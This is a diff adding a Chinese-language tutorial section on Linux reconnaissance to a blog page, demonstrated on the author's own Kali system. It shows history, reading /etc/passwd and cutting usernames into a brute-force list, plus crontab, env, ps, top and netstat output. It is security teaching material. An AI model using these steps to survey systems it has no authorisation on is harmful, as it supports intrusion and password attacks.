@@ -345,7 +345,575 @@
 <li>-a（全部文件）：列出所有文件，包括以 . 开头的隐藏文件。</li>
 <li>-h（人性化格式）：以易读的格式显示文件大小，例如 KB、MB、GB 等。</li>
 </ol>
-]]></content></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
+<h4 id="history">history</h4>
+<p>使用 <code>history</code> 命令查看早期命令可以让我们了解目标系统，尽管很少，但可以储存诸如密码、用户名之类的信息。</p>
+<p><img src="Pasted%20image%2020260113173925.png" alt=""></p>
+<h4 id="etcpasswd">/etc/passwd</h4>
+<p>阅读 <code>/etc/passwd</code> 文件是发现系统上用户的简便方式。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                    
+</span></span><span style="display:flex;"><span>└─$ cat /etc/passwd                                                               
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/usr/bin/zsh               
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                   
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                   
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync                                                                     
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin   
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                           
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                            
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>......
+</span></span></code></pre></div><p>输出很长，可以通过剪切转换为对暴力破解有用的列表。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat /etc/passwd | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>root 
+</span></span><span style="display:flex;"><span>daemon
+</span></span><span style="display:flex;"><span>bin     
+</span></span><span style="display:flex;"><span>sys      
+</span></span><span style="display:flex;"><span>sync   
+</span></span><span style="display:flex;"><span>games
+</span></span><span style="display:flex;"><span>man 
+</span></span><span style="display:flex;"><span>lp   
+</span></span><span style="display:flex;"><span>mail 
+</span></span><span style="display:flex;"><span>news
+</span></span><span style="display:flex;"><span>uucp                                              
+</span></span><span style="display:flex;"><span>proxy
+</span></span><span style="display:flex;"><span>......
+</span></span></code></pre></div><p><code>/etc/passwd</code> 中记载了所有用户（包括系统或服务器用户）。</p>
+<h4 id="etccrontab">/etc/crontab</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat /etc/crontab                 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># command to install the new version when you edit this file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># that none of the other crontabs do.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example of job definition:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># .---------------- minute (0 - 59)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  .------------- hour (0 - 23)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  |  .---------- day of month (1 - 31)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  |  |  |  |</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># *  *  *  *  * user-name command to be executed</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">{</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">{</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">{</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span></code></pre></div><p>查看自动任务。</p>
+<h4 id="echo-path">echo $PATH</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo $PATH                                         
+</span></span><span style="display:flex;"><span>/home/kali/.cargo/bin:/home/kali/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools
+</span></span></code></pre></div><p>查看环境变量，也可以使用 <code>env</code> 显示更全的环境变量。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ env                                                                                                
+</span></span><span style="display:flex;"><span>COLORFGBG<span style="color:#f92672">=</span>15;<span style="color:#ae81ff">0</span>    
+</span></span><span style="display:flex;"><span>COLORTERM<span style="color:#f92672">=</span>truecolor
+</span></span><span style="display:flex;"><span>COMMAND_NOT_FOUND_INSTALL_PROMPT<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>DBUS_SESSION_BUS_ADDRESS<span style="color:#f92672">=</span>unix:path<span style="color:#f92672">=</span>/run/user/1000/bus
+</span></span><span style="display:flex;"><span>DESKTOP_SESSION<span style="color:#f92672">=</span>lightdm-xsession
+</span></span><span style="display:flex;"><span>DISPLAY<span style="color:#f92672">=</span>:0.0     
+</span></span><span style="display:flex;"><span>DOTNET_CLI_TELEMETRY_OPTOUT<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>GDMSESSION<span style="color:#f92672">=</span>lightdm-xsession       
+</span></span><span style="display:flex;"><span>HOME<span style="color:#f92672">=</span>/home/kali
+</span></span><span style="display:flex;"><span>LANG<span style="color:#f92672">=</span>en_US.UTF-8
+</span></span><span style="display:flex;"><span>LANGUAGE<span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>LESS_TERMCAP_mb<span style="color:#f92672">=</span>                                   
+</span></span><span style="display:flex;"><span>LESS_TERMCAP_md<span style="color:#f92672">=</span>                                   
+</span></span><span style="display:flex;"><span>LESS_TERMCAP_me<span style="color:#f92672">=</span>        
+</span></span><span style="display:flex;"><span>LESS_TERMCAP_se<span style="color:#f92672">=</span>                                   
+</span></span><span style="display:flex;"><span>LESS_TERMCAP_so<span style="color:#f92672">=</span>        
+</span></span><span style="display:flex;"><span>LESS_TERMCAP_ue<span style="color:#f92672">=</span>                                                                                       
+</span></span><span style="display:flex;"><span>LESS_TERMCAP_us<span style="color:#f92672">=</span>                                   
+</span></span><span style="display:flex;"><span>LOGNAME<span style="color:#f92672">=</span>kali
+</span></span><span style="display:flex;"><span>......
+</span></span></code></pre></div><h4 id="ps--ef">ps -ef</h4>
+<p><code>ps</code> 用来查看进程，各个数据列的意义如下：</p>
+<ul>
+<li>PID：进程 ID（进程唯一）</li>
+<li>TTY：用户使用的终端类型</li>
+<li>Time：进程使用的 CPU 时间（并非进程运行时间）</li>
+<li>CMD：正在运行的命令或可执行文件</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                          
+</span></span><span style="display:flex;"><span>└─$ ps -ef                                                                                             
+</span></span><span style="display:flex;"><span>UID          PID    PPID  C STIME TTY          TIME CMD                                           
+</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">1</span>       <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span> 04:28 ?        00:00:03 /sbin/init splash           
+</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">2</span>       <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span> 04:28 ?        00:00:00 <span style="color:#f92672">[</span>kthreadd<span style="color:#f92672">]</span>                
+</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">3</span>       <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> 04:28 ?        00:00:00 <span style="color:#f92672">[</span>pool_workqueue_release<span style="color:#f92672">]</span>       
+</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> 04:28 ?        00:00:00 <span style="color:#f92672">[</span>kworker/R-kvfree_rcu_reclaim<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">5</span>       <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> 04:28 ?        00:00:00 <span style="color:#f92672">[</span>kworker/R-rcu_gp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">6</span>       <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> 04:28 ?        00:00:00 <span style="color:#f92672">[</span>kworker/R-sync_wq<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>......
+</span></span></code></pre></div><p><code>ps -A</code> 或 <code>-e</code> 查看所有进程，<code>ps -xjf</code> 查看进程树：</p>
+<ul>
+<li>a：显示所有进程，包括其他用户进程，如不使用则只显示当前终端会话的相关进程。</li>
+<li>x：显示没有连接到终端的进程，如不适应则显示当前终端会话相关进程。</li>
+<li>j：显示进程树，包含每个进程的父子进程，使用该参数会以树的方式呈现。</li>
+<li>f：以完整格式输出结果。</li>
+</ul>
+<p><img src="Pasted%20image%2020260113175817.png" alt=""></p>
+<p><code>ps aux</code> 会查显示所有用户进程（a），显示启动进程的用户（u），并显示未连接到终端的进程（x）。</p>
+<p><img src="Pasted%20image%2020260113180050.png" alt=""></p>
+<p><code>top -n 1</code> 可以帮助用户监控系统性能，查看当前运行的进程及其资源使用情况，如 <code>CPU</code> 使用率、内存使用情况。<code>-n</code> 指定 <code>top</code> 命令应显示的迭代次数。在这里，<code>-n 1</code> 表示 <code>top</code> 只运行一次，然后退出。通常，<code>top</code> 命令会持续运行，定期刷新屏幕上的信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                          
+</span></span><span style="display:flex;"><span>└─$ top -n <span style="color:#ae81ff">1</span>                                                                                           
+</span></span><span style="display:flex;"><span>top - 05:03:51 up <span style="color:#ae81ff">35</span> min,  <span style="color:#ae81ff">1</span> user,  load average: 0.17, 0.06, 0.05                                     
+</span></span><span style="display:flex;"><span>Tasks: <span style="color:#ae81ff">249</span> total,   <span style="color:#ae81ff">1</span> running, <span style="color:#ae81ff">248</span> sleeping,   <span style="color:#ae81ff">0</span> stopped,   <span style="color:#ae81ff">0</span> zombie                                   
+</span></span><span style="display:flex;"><span>%Cpu<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:  6.4 us,  1.1 sy,  0.0 ni, 92.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st 
+</span></span><span style="display:flex;"><span>MiB Mem :  29936.7 total,  28312.6 free,   1169.2 used,    879.6 buff/cache     
+</span></span><span style="display:flex;"><span>MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.  28767.5 avail Mem 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                         
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1095</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">466292</span> <span style="color:#ae81ff">149692</span>  <span style="color:#ae81ff">77600</span> S  18.2   0.5   0:30.93 Xorg                            
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">1</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">24756</span>  <span style="color:#ae81ff">14816</span>  <span style="color:#ae81ff">10776</span> S   0.0   0.0   0:03.35 systemd                         
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">2</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.01 kthreadd                        
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">3</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 pool_workqueue_release          
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">4</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/R-kvfree_rcu_reclaim    
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">5</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/R-rcu_gp                
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">6</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/R-sync_wq               
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">7</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/R-slub_flushwq          
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">8</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/R-netns                 
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">10</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/0:0H-events_highpri     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">12</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/u128:0-ipv6_addrconf    
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">13</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/R-mm_percpu_wq          
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">14</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 rcu_tasks_kthread               
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">15</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 rcu_tasks_rude_kthread          
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">16</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 rcu_tasks_trace_kthread         
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">17</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.02 ksoftirqd/0                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">18</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:01.21 rcu_preempt                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">19</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 rcu_exp_par_gp_kthread_worker/1 
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">20</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.05 rcu_exp_gp_kthread_worker       
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">21</span> root      rt   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.06 migration/0                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">22</span> root     -51   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 idle_inject/0                   
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">23</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 cpuhp/0                         
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">24</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 cpuhp/1                         
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">25</span> root     -51   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 idle_inject/1                   
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">26</span> root      rt   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.35 migration/1                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">27</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.03 ksoftirqd/1                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">29</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/1:0H-events_highpri     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">30</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 cpuhp/2                         
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">31</span> root     -51   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 idle_inject/2                   
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">32</span> root      rt   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.35 migration/2                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">33</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.01 ksoftirqd/2                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">35</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/2:0H-events_highpri     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">36</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 cpuhp/3                         
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">37</span> root     -51   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 idle_inject/3                   
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">38</span> root      rt   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.35 migration/3                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">39</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.01 ksoftirqd/3                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">41</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.02 kworker/3:0H-kblockd            
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">42</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 cpuhp/4                         
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">43</span> root     -51   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 idle_inject/4                   
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">44</span> root      rt   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.35 migration/4
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">45</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.01 ksoftirqd/4                     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">47</span> root       <span style="color:#ae81ff">0</span> -20       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.0   0.0   0:00.00 kworker/4:0H-events_highpri     
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">48</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 cpuhp/5                         
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">49</span> root     -51   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.0   0.0   0:00.00 idle_inject/5                
+</span></span></code></pre></div><h4 id="netstat">netstat</h4>
+<p>在对现有的接口和网络路由进行初始检查后，值得查看现有通信。<code>netstat</code> 命令可以与几个不同选项一起使用，以收集有关现有连接信息。</p>
+<ul>
+<li>netstat -a：显示所有在监听的端口和已建立的连接。</li>
+<li><code>netstat -at</code> / <code>netstat -ay</code>：列出 TCP 或 UDP 协议</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -at
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
